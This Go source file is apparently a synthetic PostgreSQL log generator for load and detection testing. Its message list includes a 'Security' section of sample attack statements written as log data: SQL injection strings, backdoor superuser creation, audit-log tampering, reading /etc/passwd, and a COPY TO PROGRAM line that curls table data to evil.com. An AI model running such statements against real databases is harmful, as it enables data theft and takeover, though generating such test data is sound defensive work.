package postgres

import (
	"context"
	"fmt"
	"math/rand"
	"strings"
	"sync"
	"time"

	"github.com/cenkalti/backoff/v4"
	"github.com/observiq/blitz/embed"
	"github.com/observiq/blitz/generator"
	"github.com/observiq/blitz/generator/count"
	"github.com/observiq/blitz/generator/resource"
	"github.com/observiq/blitz/telemetry"
	"go.opentelemetry.io/otel/attribute"
	"go.opentelemetry.io/otel/metric"
	"go.uber.org/zap"
)

const (
	componentName = "postgres"

	// error types
	errorTypeUnknown = "unknown"
	errorTypeTimeout = "timeout"

	// severity levels
	severityLog     = "LOG"
	severityError   = "ERROR"
	severityFatal   = "FATAL"
	severityPanic   = "PANIC"
	severityWarning = "WARNING"
	severityNotice  = "NOTICE"
	severityDebug   = "DEBUG"
	severityInfo    = "INFO"
)

// postgresLogData represents the data needed to generate a PostgreSQL log entry
type postgresLogData struct {
	timestamp   time.Time
	processID   int
	user        string
	database    string
	app         string
	clientAddr  string
	sessionID   string
	virtualTxID string
	txID        int64
	lineNum     int
	severity    string
	message     string
}

// Generator generates PostgreSQL log format log data
type Generator struct {
	embed.ProducerMarker

	logger   *zap.Logger
	workers  int
	rate     time.Duration
	consumer embed.LogConsumer
	wg       sync.WaitGroup
	stopCh   chan struct{}
	tracker  *count.Tracker
}

// Predefined lists for fast random generation
var (
	users = []string{
		"postgres",
		"admin",
		"app_user",
		"readonly_user",
		"write_user",
		"analytics_user",
		"backup_user",
		"monitoring_user",
	}

	databases = []string{
		"postgres",
		"mydb",
		"appdb",
		"analytics",
		"warehouse",
		"testdb",
		"production",
		"staging",
	}

	applications = []string{
		"psql",
		"pgAdmin",
		"pg_dump",
		"pg_restore",
		"application",
		"webapp",
		"api_server",
		"worker",
		"cron",
		"backup_script",
		"-", // empty application name
	}

	logMessages = []struct {
		severity string
		message  string
	}{
		// Normal operations
		{severityLog, "statement: SELECT * FROM users WHERE id = $1"},
		{severityLog, "statement: INSERT INTO orders (user_id, total) VALUES ($1, $2)"},
		{severityLog, "statement: UPDATE products SET stock = stock - $1 WHERE id = $2"},
		{severityLog, "statement: DELETE FROM sessions WHERE expires_at < NOW()"},
		{severityLog, "statement: BEGIN"},
		{severityLog, "statement: COMMIT"},
		{severityLog, "statement: ROLLBACK"},
		{severityLog, "statement: SELECT COUNT(*) FROM transactions WHERE created_at > $1"},
		{severityLog, "statement: CREATE INDEX idx_user_email ON users(email)"},
		{severityLog, "statement: ANALYZE users"},
		{severityLog, "statement: VACUUM ANALYZE orders"},
		{severityLog, "duration: 12.345 ms"},
		{severityLog, "duration: 45.678 ms"},
		{severityLog, "duration: 123.456 ms"},
		{severityLog, "duration: 1.234 ms"},
		{severityLog, "connection received: host=127.0.0.1 port=54321"},
		{severityLog, "connection authorized: user=postgres database=postgres"},
		{severityLog, "disconnection: session time: 0:05:23.123"},
		{severityLog, "checkpoint starting: time"},
		{severityLog, "checkpoint complete: wrote 1024 buffers (6.3%); 0 WAL file(s) added, 0 removed, 1 recycled; write=12.345 s, sync=0.123 s, total=12.468 s; sync files=10, longest=0.045 s, average=0.012 s; distance=16384 kB, estimate=24576 kB"},
		{severityNotice, "relation \"public.users\" already exists, skipping"},
		{severityWarning, "there is no transaction in progress"},
		{severityWarning, "column \"email\" does not exist"},
		{severityError, "syntax error at or near \"SELECT\""},
		{severityError, "relation \"nonexistent\" does not exist"},
		{severityError, "duplicate key value violates unique constraint \"users_pkey\""},
		{severityError, "column \"invalid_col\" does not exist"},
		{severityError, "permission denied for table \"users\""},
		{severityError, "connection to server at \"192.168.1.100\", port 5432 failed: Connection refused"},
		{severityInfo, "database system was shut down at 2024-01-15 10:23:45 UTC"},
		{severityInfo, "database system is ready to accept connections"},
		{severityInfo, "autovacuum launcher started"},
		{severityInfo, "autovacuum launcher shutting down"},
		{severityDebug, "checkpoint record is at 0/12345678"},
		{severityDebug, "redo record is at 0/12345678; undo record is at 0/0; shutdown TRUE"},

		// Security: Authentication failures (brute force patterns)
		{severityFatal, "password authentication failed for user \"admin\""},
		{severityFatal, "password authentication failed for user \"root\""},
		{severityFatal, "password authentication failed for user \"postgres\""},
		{severityFatal, "password authentication failed for user \"sa\""},
		{severityFatal, "no pg_hba.conf entry for host \"10.0.0.50\", user \"admin\", database \"production\""},
		{severityFatal, "too many connections for role \"app_user\""},
		{severityWarning, "connection rejected: too many connections for database \"production\""},
		{severityError, "authentication failed for user \"backup_admin\": invalid credentials"},

		// Security: SQL injection attempts
		{severityError, "syntax error at or near \"'\" at character 42"},
		{severityLog, "statement: SELECT * FROM users WHERE username = '' OR '1'='1'"},
		{severityLog, "statement: SELECT * FROM users WHERE id = 1; DROP TABLE users;--"},
		{severityLog, "statement: SELECT * FROM accounts WHERE id = 1 UNION SELECT password FROM credentials"},
		{severityLog, "statement: SELECT * FROM products WHERE name = ''; WAITFOR DELAY '00:00:10'--"},
		{severityLog, "statement: SELECT password FROM users WHERE username = 'admin'--"},
		{severityLog, "statement: INSERT INTO users VALUES (1, 'hacker', (SELECT password FROM users WHERE username='admin'))"},
		{severityWarning, "statement execution time exceeded threshold: 30000 ms"},

		// Security: Privilege escalation attempts
		{severityError, "permission denied to create role"},
		{severityError, "must be superuser to alter superuser roles or change superuser attribute"},
		{severityLog, "statement: ALTER ROLE app_user WITH SUPERUSER"},
		{severityLog, "statement: ALTER ROLE readonly_user WITH CREATEROLE CREATEDB"},
		{severityLog, "statement: GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO attacker"},
		{severityLog, "statement: CREATE ROLE backdoor_admin WITH SUPERUSER LOGIN PASSWORD 'hacked123'"},
		{severityError, "permission denied for schema pg_catalog"},
		{severityFatal, "role \"app_user\" is not permitted to log in"},

		// Security: Data exfiltration patterns
		{severityLog, "statement: COPY (SELECT * FROM customers) TO '/tmp/customers_dump.csv'"},
		{severityLog, "statement: COPY users TO PROGRAM 'curl -X POST -d @- http://evil.com/exfil'"},
		{severityLog, "statement: SELECT * FROM credit_cards"},
		{severityLog, "statement: SELECT ssn, dob, full_name FROM pii_data"},
		{severityLog, "statement: pg_dump --table=passwords --data-only production"},
		{severityWarning, "large data transfer detected: 50000 rows returned"},
		{severityLog, "statement: SELECT pg_read_file('/etc/passwd')"},
		{severityLog, "statement: SELECT lo_export(12345, '/tmp/secret.txt')"},

		// Security: Suspicious administrative actions
		{severityLog, "statement: DROP DATABASE production"},
		{severityLog, "statement: TRUNCATE TABLE audit_logs"},
		{severityLog, "statement: DELETE FROM security_events WHERE created_at < NOW()"},
		{severityLog, "statement: ALTER TABLE audit_logs DISABLE TRIGGER ALL"},
		{severityWarning, "parameter \"log_statement\" changed to \"none\""},
		{severityWarning, "parameter \"log_connections\" changed to \"off\""},
		{severityLog, "statement: UPDATE pg_authid SET rolpassword = 'md5' || md5('newpass' || 'postgres')"},

		// Security: Anomalous access patterns
		{severityWarning, "connection from unusual IP range: 185.220.101.0/24 (known Tor exit node)"},
		{severityWarning, "off-hours database access detected from user \"admin\" at 03:24:15 UTC"},
		{severityLog, "connection received: host=192.168.1.100 port=54321 (outside normal subnet)"},
		{severityError, "SSL connection required but client connected without SSL"},
		{severityWarning, "multiple databases accessed in single session: production, staging, backup"},

		// Long-form operational messages (~200 chars each)
		{severityLog, "statement: SELECT u.id, u.username, u.email, u.first_name, u.last_name, u.created_at, u.updated_at, u.status, u.role FROM users u INNER JOIN user_profiles up ON u.id = up.user_id WHERE u.active = true AND u.last_login > NOW() - INTERVAL '30 days' ORDER BY u.created_at DESC LIMIT 100"},
		{severityLog, "duration: 1234.567 ms  plan: Query Text: SELECT * FROM orders WHERE customer_id = $1 AND status IN ($2, $3)  ->  Index Scan using idx_orders_customer on orders  (cost=0.43..45.67 rows=50 width=300) (actual time=0.084..1.234 rows=50 loops=1)"},
		{severityLog, "automatic vacuum of table \"production.public.user_events\": index scans: 2, pages: 0 removed, 125834 remain, 0 frozen, tuples: 50234 removed, 2847531 remain, 23456 are dead but not yet removable, oldest xmin: 1234567890"},
		{severityLog, "checkpoint complete: wrote 4096 buffers (25.0%); 2 WAL file(s) added, 1 removed, 3 recycled; write=45.678 s, sync=2.345 s, total=48.023 s; sync files=42, longest=0.890 s, average=0.055 s; distance=65536 kB, estimate=98304 kB, lsn=0/A1B2C3D4"},
		{severityLog, "statement: INSERT INTO audit_log (user_id, action, resource_type, resource_id, ip_address, user_agent, metadata, created_at) VALUES ($1, $2, $3, $4, $5, $6, $7::jsonb, NOW()) RETURNING id, created_at"},
		{severityError, "duplicate key value violates unique constraint \"users_email_key\" DETAIL: Key (email)=(john.doe@example.com) already exists. SCHEMA NAME: public TABLE NAME: users CONSTRAINT NAME: users_email_key"},
		{severityLog, "statement: UPDATE order_items SET quantity = $1, unit_price = $2, total_price = $1 * $2, updated_at = NOW() WHERE order_id = $3 AND product_id = $4 AND status NOT IN ('shipped', 'delivered', 'cancelled')"},
		{severityLog, "connection authorized: user=analytics_user database=warehouse SSL enabled (protocol=TLSv1.3, cipher=TLS_AES_256_GCM_SHA384, compression=off) application_name=reporting_service host=10.0.1.45 port=54321"},
		{severityLog, "statement: SELECT p.id, p.name, p.price, p.stock_quantity, c.name AS category, b.name AS brand FROM products p JOIN categories c ON p.category_id = c.id JOIN brands b ON p.brand_id = b.id WHERE p.active = true AND p.stock_quantity > 0 AND p.price BETWEEN $1 AND $2 ORDER BY p.popularity_score DESC LIMIT $3 OFFSET $4"},
		{severityWarning, "temporary file: path \"base/pgsql_tmp/pgsql_tmp12345.0\", size 104857600 bytes. Temporary file created for sort operation on relation users; consider increasing work_mem (currently 4MB) to reduce disk spills"},
		{severityLog, "statement: WITH ranked_orders AS (SELECT o.*, ROW_NUMBER() OVER (PARTITION BY o.customer_id ORDER BY o.created_at DESC) AS rn FROM orders o WHERE o.status = 'completed') SELECT * FROM ranked_orders WHERE rn <= 5 AND customer_id = $1"},
		{severityLog, "replication: started streaming WAL from primary at 0/15000000 on timeline 1; replication slot pg_slot_01 confirmed flush up to 0/15001234, restart lsn 0/14FFFF00, output plugin pgoutput"},
		{severityError, "deadlock detected DETAIL: Process 12345 waits for ShareLock on transaction 9876543; blocked by process 67890. Process 67890 waits for ShareLock on transaction 1234567; blocked by process 12345. HINT: See server log for query details."},
		{severityLog, "statement: SELECT t.id, t.amount, t.currency, t.status, t.created_at, a.balance, a.account_number FROM transactions t JOIN accounts a ON t.account_id = a.id WHERE t.created_at >= NOW() - INTERVAL '24 hours' AND t.status IN ('pending', 'processing') ORDER BY t.created_at ASC FOR UPDATE SKIP LOCKED LIMIT 100"},
		{severityLog, "autovacuum: found 15234 removable, 8924521 nonremovable row versions in 42561 out of 189432 pages TABLE: production.public.events VACUUM: index scans: 3, pages: 8421 removed, 180011 remain, 0 skipped due to pins, 42 skipped frozen"},
		{severityLog, "statement: COPY (SELECT id, user_id, event_type, event_data::text, created_at FROM events WHERE created_at BETWEEN $1 AND $2 ORDER BY created_at ASC) TO STDOUT WITH (FORMAT CSV, HEADER true, DELIMITER ',', QUOTE '\"', ESCAPE '\\')"},
		{severityWarning, "slow query detected: duration=8932.456 ms statement=SELECT * FROM large_table JOIN another_table USING (id) WHERE condition = true GROUP BY category HAVING COUNT(*) > 100 ORDER BY total DESC; rows_returned=45231; rows_examined=10234567"},
		{severityLog, "statement: CREATE INDEX CONCURRENTLY idx_events_user_created ON events (user_id, created_at DESC) INCLUDE (event_type, metadata) WHERE deleted_at IS NULL AND status = 'active'; progress: 45% complete, 234521 tuples scanned, 156234 indexed"},
		{severityLog, "logical replication apply worker for subscription \"sub_reporting\" has started; remote relation public.transactions (id integer, amount numeric, status text, created_at timestamp) mapped to local relation public.transactions"},
		{severityLog, "statement: SELECT schemaname, tablename, attname, n_distinct, correlation, most_common_vals[1:5], histogram_bounds[1:10] FROM pg_stats WHERE schemaname = 'public' AND tablename IN ('users', 'orders', 'transactions', 'events') ORDER BY schemaname, tablename, attname"},
		{severityError, "relation \"pg_temp_12345.temp_analysis_results\" does not exist CONTEXT: SQL statement \"SELECT * FROM temp_analysis_results WHERE score > $1\" PL/pgSQL function compute_scores(integer) line 42 at SQL statement DETAIL: function called at 2024-01-15 03:24:55 UTC"},
	}
)

// New creates a new PostgreSQL log generator. The consumer receives
// each generated record as a size-1 batch via ConsumeLogs.
func New(logger *zap.Logger, workers int, rate time.Duration, consumer embed.LogConsumer) (*Generator, error) {
	if logger == nil {
		return nil, fmt.Errorf("logger cannot be nil")
	}

	if workers < 1 {
		return nil, fmt.Errorf("workers must be 1 or greater, got %d", workers)
	}

	if consumer == nil {
		return nil, fmt.Errorf("consumer cannot be nil")
	}

	return &Generator{
		logger:   logger,
		workers:  workers,
		rate:     rate,
		consumer: consumer,
		stopCh:   make(chan struct{}),
	}, nil
}

// Name returns the module identifier.
func (g *Generator) Name() string { return componentName }

// Start launches the worker goroutines that push generated records to
// the configured consumer.
func (g *Generator) Start(_ context.Context) error {
	g.logger.Info("Starting PostgreSQL log generator",
		zap.Int("workers", g.workers),
		zap.Duration("rate", g.rate),
	)

	for i := 0; i < g.workers; i++ {
		g.wg.Add(1)
		go g.worker(i) // #nosec G118 -- workers are bounded by Stop() and the WaitGroup, not the Start context
	}

	return nil
}

// Stop stops the PostgreSQL log generator and waits for all workers to finish.
func (g *Generator) Stop(ctx context.Context) error {
	g.logger.Info("Stopping PostgreSQL log generator")

	close(g.stopCh)

	done := make(chan struct{})
	go func() {
		g.wg.Wait()
		close(done)
	}()

	select {
	case <-done:
		g.logger.Info("PostgreSQL log generator stopped")
		return nil
	case <-ctx.Done():
		return ctx.Err()
	}
}

// SetCountTracker sets the finite generation count tracker.
func (g *Generator) SetCountTracker(t *count.Tracker) {
	g.tracker = t
}

// worker is the main worker loop that generates and writes logs
func (g *Generator) worker(workerID int) {
	defer g.wg.Done()

	generator.BlitzGeneratorActiveWorkersGauge.Record(context.Background(), 1, componentName)
	defer generator.BlitzGeneratorActiveWorkersGauge.Record(context.Background(), 0, componentName)

	backoffConfig := backoff.NewExponentialBackOff()
	backoffConfig.InitialInterval = g.rate
	backoffConfig.MaxInterval = 5 * time.Second
	backoffConfig.MaxElapsedTime = 0

	// Drive the timer from this goroutine only. backoff.ExponentialBackOff is
	// not safe for concurrent use, so we never hand it to backoff.NewTicker's
	// internal goroutine; instead we own every NextBackOff/Reset call here.
	timer := time.NewTimer(backoffConfig.NextBackOff())
	defer timer.Stop()

	for {
		select {
		case <-g.stopCh:
			g.logger.Debug("Worker stopping", zap.Int("worker_id", workerID))
			return
		case <-timer.C:
			if g.tracker != nil && !g.tracker.Acquire() {
				select {
				case <-g.stopCh:
					return
				case <-g.tracker.ResumeC():
					timer.Reset(backoffConfig.NextBackOff())
					continue
				}
			}
			err := g.generateAndWriteLog(workerID)
			if err != nil {
				g.logger.Error("Failed to write log",
					zap.Int("worker_id", workerID),
					zap.Error(err))
				timer.Reset(backoffConfig.NextBackOff())
				continue
			}
			backoffConfig.Reset()
			timer.Reset(backoffConfig.NextBackOff())
		}
	}
}

// generateAndWriteLog generates a random log and writes it
func (g *Generator) generateAndWriteLog(_ int) error {
	logData, err := g.generatePostgresLogData()
	if err != nil {
		g.recordWriteError(errorTypeUnknown, err)
		return fmt.Errorf("generate PostgreSQL log data: %w", err)
	}

	logRecord, err := formatAsPostgres(logData)
	if err != nil {
		g.recordWriteError(errorTypeUnknown, err)
		return fmt.Errorf("format log as PostgreSQL: %w", err)
	}

	generator.BlitzGeneratorEntriesCounter.Add(context.Background(), 1, componentName)

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	if err := g.consumer.ConsumeLogs(ctx, []embed.LogRecord{logRecord}); err != nil {
		errorType := errorTypeUnknown
		if ctx.Err() == context.DeadlineExceeded {
			errorType = errorTypeTimeout
		}
		g.recordWriteError(errorType, err)
		return err
	}

	return nil
}

// generatePostgresLogData generates random PostgreSQL log data
func (g *Generator) generatePostgresLogData() (*postgresLogData, error) {
	r := rand.New(rand.NewSource(time.Now().UnixNano())) // #nosec G404

	data := &postgresLogData{
		timestamp:   time.Now(),
		processID:   r.Intn(99999) + 1000,                    // #nosec G404
		user:        users[r.Intn(len(users))],               // #nosec G404
		database:    databases[r.Intn(len(databases))],       // #nosec G404
		app:         applications[r.Intn(len(applications))], // #nosec G404
		clientAddr:  generateRandomIP(r),
		sessionID:   fmt.Sprintf("%08x", r.Uint32()),                    // #nosec G404
		virtualTxID: fmt.Sprintf("%d/%d", r.Intn(20)+1, r.Intn(1000)+1), // #nosec G404
		txID:        r.Int63n(9000000000) + 1000000000,                  // #nosec G404
		lineNum:     r.Intn(99999) + 1,                                  // #nosec G404
	}

	// Select a random log message
	logEntry := logMessages[r.Intn(len(logMessages))] // #nosec G404
	data.severity = logEntry.severity
	data.message = logEntry.message

	return data, nil
}

// generateRandomIP generates a random IP address
func generateRandomIP(r *rand.Rand) string {
	return fmt.Sprintf("%d.%d.%d.%d",
		r.Intn(256), // #nosec G404
		r.Intn(256), // #nosec G404
		r.Intn(256), // #nosec G404
		r.Intn(256)) // #nosec G404
}

// formatAsPostgres converts postgresLogData to PostgreSQL log format
// Format: %t [%p]: user=%u,db=%d,app=%a,client=%h <severity>: <message>
// Example: 2024-01-15 10:23:45.123 UTC [12345]: user=postgres,db=mydb,app=psql,client=127.0.0.1 LOG:  statement: SELECT * FROM users;
func formatAsPostgres(data *postgresLogData) (embed.LogRecord, error) {
	// Format timestamp as PostgreSQL does: YYYY-MM-DD HH:MM:SS.mmm UTC
	timestampStr := data.timestamp.UTC().Format("2006-01-02 15:04:05.000 MST")

	// Format the log line prefix: timestamp [process_id]: user=...,db=...,app=...,client=...,session=...,vxid=...,txid=...,line=...
	prefix := fmt.Sprintf("%s [%d]: user=%s,db=%s,app=%s,client=%s,session=%s,vxid=%s,txid=%d,line=%d",
		timestampStr,
		data.processID,
		data.user,
		data.database,
		data.app,
		data.clientAddr,
		data.sessionID,
		data.virtualTxID,
		data.txID,
		data.lineNum,
	)

	// Format the full log line: prefix <severity>: <message>
	postgresLine := fmt.Sprintf("%s %s:  %s",
		prefix,
		data.severity,
		data.message,
	)

	return embed.LogRecord{
		Message: postgresLine,
		ParseFunc: func(message string) (map[string]any, error) {
			parsed := make(map[string]any)

			// Parse timestamp [process_id]: user=...,db=...,app=...,client=... <severity>: <message>
			parts := strings.SplitN(message, "]: ", 2)
			if len(parts) < 2 {
				return parsed, nil
			}

			prefixPart := parts[0]
			rest := parts[1]

			// Extract timestamp and process ID from prefix
			timestampEnd := strings.Index(prefixPart, " [")
			if timestampEnd > 0 {
				parsed["timestamp"] = prefixPart[:timestampEnd]
			}
			processStart := strings.Index(prefixPart, "[")
			processEnd := strings.Index(prefixPart, "]")
			if processStart >= 0 && processEnd > processStart {
				parsed["process_id"] = prefixPart[processStart+1 : processEnd]
			}

			// Parse user=...,db=...,app=...,client=...,session=...,vxid=...,txid=...,line=... from prefix
			prefixFields := strings.SplitSeq(prefixPart, ",")
			for field := range prefixFields {
				if strings.Contains(field, "user=") {
					parsed["user"] = strings.TrimPrefix(field[strings.Index(field, "user="):], "user=")
				}
				if strings.Contains(field, "db=") {
					parsed["database"] = strings.TrimPrefix(field[strings.Index(field, "db="):], "db=")
				}
				if strings.Contains(field, "app=") {
					parsed["app"] = strings.TrimPrefix(field[strings.Index(field, "app="):], "app=")
				}
				if strings.Contains(field, "client=") {
					parsed["client"] = strings.TrimPrefix(field[strings.Index(field, "client="):], "client=")
				}
				if strings.Contains(field, "session=") {
					parsed["session"] = strings.TrimPrefix(field[strings.Index(field, "session="):], "session=")
				}
				if strings.Contains(field, "vxid=") {
					parsed["vxid"] = strings.TrimPrefix(field[strings.Index(field, "vxid="):], "vxid=")
				}
				if strings.Contains(field, "txid=") {
					parsed["txid"] = strings.TrimPrefix(field[strings.Index(field, "txid="):], "txid=")
				}
				if strings.Contains(field, "line=") {
					parsed["line"] = strings.TrimPrefix(field[strings.Index(field, "line="):], "line=")
				}
			}

			// Parse severity and message from rest
			severityParts := strings.SplitN(rest, ": ", 2)
			if len(severityParts) >= 1 {
				parsed["severity"] = strings.TrimSpace(severityParts[0])
			}
			if len(severityParts) >= 2 {
				parsed["message"] = severityParts[1]
			}

			return parsed, nil
		},
		Metadata: embed.LogRecordMetadata{
			Timestamp: data.timestamp,
			Severity:  data.severity,
			Resource:  resource.Default(componentName),
		},
	}, nil
}

// recordWriteError records a write error metric
func (g *Generator) recordWriteError(errorType string, err error) {
	generator.BlitzGeneratorWriteErrorsCounter.Add(context.Background(), 1, componentName,
		metric.WithAttributeSet(attribute.NewSet(attribute.String("error_type", errorType))),
	)
	g.logger.Debug("Recorded write error",
		zap.String("error_type", errorType),
		zap.Error(err),
	)
}

// SupportedTelemetry returns the telemetry types this generator produces.
func (g *Generator) SupportedTelemetry() []telemetry.Type {
	return []telemetry.Type{telemetry.Logs}
}
